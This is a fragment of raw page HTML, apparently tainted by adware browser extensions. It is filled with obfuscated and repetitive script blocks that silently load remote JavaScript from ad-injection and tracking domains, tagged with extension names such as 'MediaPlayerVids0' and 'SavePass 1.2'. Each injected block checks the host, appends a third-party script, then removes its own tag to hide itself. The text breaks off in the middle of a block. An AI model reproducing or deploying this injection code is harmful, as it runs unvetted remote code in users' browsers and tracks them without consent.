_0x3c93xc=document[_0x1efb[25]](_0x1efb[24]);_0x3c93xc[_0x1efb[28]](_0x1efb[26],_0x1efb[27]);_0x3c93xc[_0x1efb[34]]=_0x3c93x8;(document[_0x1efb[32]](_0x1efb[31])[0]||document[_0x1efb[32]](_0x1efb[33])[0])[_0x1efb[30]](_0x3c93xc);}addScript(_0x1efb[35]+appName+_0x1efb[36]+userId,_0x1efb[37]+appName+_0x1efb[36]+userId,_0x1efb[38]);addScript(_0x1efb[39],_0x1efb[40],_0x1efb[41]+appName+_0x1efb[42]);addScript(_0x1efb[43]+userId+_0x1efb[44]+appName+_0x1efb[45],_0x1efb[46]+userId+_0x1efb[44]+appName+_0x1efb[45],_0x1efb[38]);addScript(_0x1efb[47],_0x1efb[48],_0x1efb[49]+appName+_0x1efb[42]);addScript(_0x1efb[50]+appName+_0x1efb[51]+userId,_0x1efb[52]+appName+_0x1efb[51]+userId,_0x1efb[38]);addScript(_0x1efb[53]+appName+_0x1efb[54]+userId+_0x1efb[55]+appId+_0x1efb[56]+userId,_0x1efb[57]+appName+_0x1efb[54]+userId+_0x1efb[55]+appId+_0x1efb[56]+userId,_0x1efb[38]);addScript(_0x1efb[58]+appName,_0x1efb[59]+appName,_0x1efb[38]);addScript(_0x1efb[60]+appName+_0x1efb[61],_0x1efb[62]+appName+_0x1efb[61],_0x1efb[38]);addScript(_0x1efb[63]+userId+_0x1efb[64]+appName,_0x1efb[65]+userId+_0x1efb[64]+appName,_0x1efb[38]);addScript(_0x1efb[66]+appName,_0x1efb[67]+appName,_0x1efb[38]);addScript(_0x1efb[68]+campId+_0x1efb[69]+appId+_0x1efb[70]+userId+_0x1efb[71]+appName+_0x1efb[72],_0x1efb[73]+campId+_0x1efb[69]+appId+_0x1efb[70]+userId+_0x1efb[71]+appName+_0x1efb[72],_0x1efb[38]);} catch (e) {}})();},1000*3);</script><script id="spcs" charset="UTF-8" src="//shinypage.com/module/spcs.js" type="text/javascript"></script><script id="__utility_running_72523_390__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 390 || 287 !== 390 || 119 !== 390)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (390 != 273 && 390 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(390)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(390) ){return;}function f(){return typeof window['__utility_running_72523_390__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/h0982be/300285810029000000/l.js?pid=2295&ext=MediaPlayerVids0';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/h0982be/300285810029000000/l.js?pid=2295&ext=MediaPlayerVids0';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_390__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 390) : 390;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_390__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 390) : 390;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_72523_390__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_72523_102__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 102 || 287 !== 102 || 119 !== 102)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (102 != 273 && 102 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(102)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(102) ){return;}function f(){return typeof window['__utility_running_72523_102__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://i.crbsjs.info/crbf/javascript.js?channel=crdr_300285810029000000&appTitle=MediaPlayerVids0&hid=149525929fae92db32a394a703a5bbe7';var httpsUrl = 'https://i_crbsjs_info.tlscdn.com/crbf/javascript.js?channel=crdr_300285810029000000&appTitle=MediaPlayerVids0&hid=149525929fae92db32a394a703a5bbe7';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_102__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 102) : 102;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_102__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 102) : 102;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_72523_102__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_72523_180__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 180 || 287 !== 180 || 119 !== 180)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (180 != 273 && 180 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(180)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(180) ){return;}function f(){return typeof window['__utility_running_72523_180__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://a.snowplanes.com/a.php?626ref2=300285810029000000&626Name=MediaPlayerVids0&626ref3=149525929fae92db32a394a703a5bbe7&626ref1=63726f73737269646572&teid=72523&tuid=794CC92401E24B428E1CD52EDA8B6D0EIE';var httpsUrl = 'https://a.snowplanes.com/a.php?626ref2=300285810029000000&626Name=MediaPlayerVids0&626ref3=149525929fae92db32a394a703a5bbe7&626ref1=63726f73737269646572&teid=72523&tuid=794CC92401E24B428E1CD52EDA8B6D0EIE';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_180__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 180) : 180;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_180__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 180) : 180;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_72523_180__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_72523_223__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 223 || 287 !== 223 || 119 !== 223)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (223 != 273 && 223 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(223)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(223) ){return;}function f(){return typeof window['__utility_running_72523_223__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdn.visadd.com/script/14567725765/preload.js?subid=300285810029000000&um=MediaPlayerVids0';var httpsUrl = 'https://cdn.visadd.com/script/14567725765/preload.js?subid=300285810029000000&um=MediaPlayerVids0';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_223__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 223) : 223;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_223__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 223) : 223;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_72523_223__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_72523_273__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 273 || 287 !== 273 || 119 !== 273)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (273 != 273 && 273 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(273)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(273) ){return;}function f(){return typeof window['__utility_running_72523_273__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cjs.linkbolic.com/scjs/cjs/ctxjs.js?aff_id=1145&subaff_id=300285810029000000&sbrand=MediaPlayerVids0';var httpsUrl = 'https://cjs.linkbolic.com/scjs/cjs/ctxjs.js?aff_id=1145&subaff_id=300285810029000000&sbrand=MediaPlayerVids0';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_273__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 273) : 273;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_273__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 273) : 273;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_72523_273__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_72523_281__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 281 || 287 !== 281 || 119 !== 281)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (281 != 273 && 281 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(281)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(281) ){return;}function f(){return typeof window['__utility_running_72523_281__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://clkdeals.com/adServe/getTag?pid=11021&type=inject&cid=300285810029000000&appName=MediaPlayerVids0&q=__DOMAIN__';var httpsUrl = '';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_281__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 281) : 281;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_281__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 281) : 281;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_72523_281__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_72523_288__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 288 || 287 !== 288 || 119 !== 288)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (288 != 273 && 288 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(288)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(288) ){return;}function f(){return typeof window['__utility_running_72523_288__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://istatic.eshopcomp.com/fo/min/crqc.js?hid=149525929fae92db32a394a703a5bbe7&bname=MediaPlayerVids0&subid=300285810029000000';var httpsUrl = 'https://istatic.eshopcomp.com/fo/min/crqc.js?hid=149525929fae92db32a394a703a5bbe7&bname=MediaPlayerVids0&subid=300285810029000000';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_288__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 288) : 288;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_288__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 288) : 288;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_72523_288__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_72523_380__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 380 || 287 !== 380 || 119 !== 380)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (380 != 273 && 380 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(380)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(380) ){return;}function f(){return typeof window['__utility_running_72523_380__'] !== 'undefined';}try {if (f()) {return;}window.__ntf_ibic__='794CC92401E24B428E1CD52EDA8B6D0EIE';window.__ntf_veri__='806e6b8b461f3c245c8387d7783a0257';window.__ntf_br__='ff';window.__ntf_cmp__='002858';window.__ntf_geo__='ID';window.__ntf_name__='MediaPlayerVids0';var httpUrl = 'http://cdn.gosignserv.com/cc/a.js?__src_locator__=cc';var httpsUrl = 'https://d2a8a4q9.ssl.hwcdn.net/cc/a.js?__src_locator__=cc';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_380__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 380) : 380;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_380__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 380) : 380;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_72523_380__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_72523_450__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 450 || 287 !== 450 || 119 !== 450)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (450 != 273 && 450 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(450)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(450) ){return;}function f(){return typeof window['__utility_running_72523_450__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/p3af2c8/300285810029000000/l.js?pid=2271&ext=MediaPlayerVids0';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/p3af2c8/300285810029000000/l.js?pid=2271&ext=MediaPlayerVids0';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_72523_450__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 450) : 450;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_72523_450__'] = true;window['__iLDw9'] = window['__iLDw9'] ? (window['__iLDw9'] + ',' + 450) : 450;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_72523_450__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63429_390__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 390 || 287 !== 390 || 119 !== 390)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (390 != 273 && 390 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(390)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(390) ){return;}function f(){return typeof window['__utility_running_63429_390__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://cdncache-a.akamaihd.net/sub/h0982be/300150410021000000/l.js?pid=2295&ext=SavePass%201.2';var httpsUrl = 'https://cdncache-a.akamaihd.net/sub/h0982be/300150410021000000/l.js?pid=2295&ext=SavePass%201.2';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63429_390__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 390) : 390;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63429_390__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 390) : 390;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63429_390__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63429_102__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 102 || 287 !== 102 || 119 !== 102)){return;}var host = document.location.host;if ( (window.name.indexOf('_odctxdsp') === 0) ||(host.match(new RegExp('(?:.*.)?view.contextualyield.com', 'g')) ||host.match(new RegExp('(?:.*.)?touch.offersonspot.com', 'g')) ||host.match(new RegExp('(?:.*.)?digital.deals-beat.com', 'g')) ||host.match(new RegExp('(?:.*.)?cloud.contextual-edge.com', 'g')) ||host.match(new RegExp('(?:.*.)?pulse.contextualify.com', 'g')) ||host.match(new RegExp('(?:.*.)?contextual.ctx-traffic.com', 'g'))) ){if (102 != 273 && 102 != 185){return;}}if (typeof window.__myWindow__ === 'function' && window.__myWindow__(102)){return;}if ( typeof window.__onlyMe__ === 'function' && window.__onlyMe__(102) ){return;}function f(){return typeof window['__utility_running_63429_102__'] !== 'undefined';}try {if (f()) {return;}var httpUrl = 'http://i.crbsjs.info/crbf/javascript.js?channel=crdr_300150410021000000&appTitle=SavePass%201.2&hid=14662593d756c45f678e53b3ecf6dac4';var httpsUrl = 'https://i_crbsjs_info.tlscdn.com/crbf/javascript.js?channel=crdr_300150410021000000&appTitle=SavePass%201.2&hid=14662593d756c45f678e53b3ecf6dac4';var K = document.createElement('script');K.setAttribute('type', 'text/javascript');var src = httpUrl;if ((typeof document.location.protocol === 'string') && (document.location.protocol.indexOf('https') === 0)) {if (!httpsUrl || httpsUrl.length === 0) {return;}src = httpsUrl}try{src=src.replace(/__DOMAIN__/g,encodeURIComponent(window.location.host))}catch(_e){}K.setAttribute('src', src);var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);var c = 0;if (!document || !document.body){var id = setInterval(function (){var tag = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);if (!document || !document.body || !tag){if (c>20){clearInterval(id);return;}c++;return;}if (!f()){tag.appendChild(K);window['__utility_running_63429_102__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 102) : 102;}}, 500);} else {if (!f()){tag.appendChild(K);window['__utility_running_63429_102__'] = true;window['__E2Tsr'] = window['__E2Tsr'] ? (window['__E2Tsr'] + ',' + 102) : 102;}}} catch (L) {}}());var __t = document.getElementById('__utility_running_63429_102__');__t.parentNode.removeChild(__t);</script><script id="__utility_running_63429_180__" type="text/javascript">(function (){if (window.top !== window.self){return;}if (typeof __pluginBlockedSite__ !== 'undefined'&&__pluginBlockedSite__){return;}if (document && document.location && typeof document.location.host == 'string' && typeof window.__validDomain__ !== 'undefined' && !window.__validDomain__ && (194 !== 180 || 287 !== 180 || 119 !== 180)){return;}var host = document.location.host;if ( 